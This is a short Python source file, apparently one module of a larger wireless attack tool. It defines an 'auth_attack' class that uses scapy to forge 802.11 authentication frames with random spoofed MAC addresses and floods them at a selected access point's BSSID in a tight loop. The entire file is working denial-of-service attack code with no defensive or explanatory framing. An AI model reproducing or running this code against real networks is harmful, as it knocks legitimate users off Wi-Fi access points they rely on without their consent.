import threading
import scapy.all as scapy
import time
import globals

class auth_attack():
    def __init__(self):
        self._stop_event = threading.Event()
        self.IFACE = globals.interface
    def stop(self):
        self._stop_event.set()
    def reset(self):
        self._stop_event = threading.Event()
    def build_auth_packet(self):
        rand_mac = scapy.RandMAC()
        packet = (scapy.RadioTap()/
                  scapy.Dot11(type = 0,
                              subtype = 11,
                              addr1 = globals.selected_bssid,
                              addr2 = rand_mac,
                              addr3 = rand_mac)/
                    scapy.Dot11Auth(algo = 0, seqnum=1, status=0))
        return packet
    def start_auth_attack(self):
        while not self._stop_event.is_set() or not globals.larp_mode:
            try:
                packet = self.build_auth_packet()
                time.sleep(0.01)
                scapy.sendp(packet, iface = self.IFACE, verbose = False)
            except Exception as e:
                time.sleep(0.01)
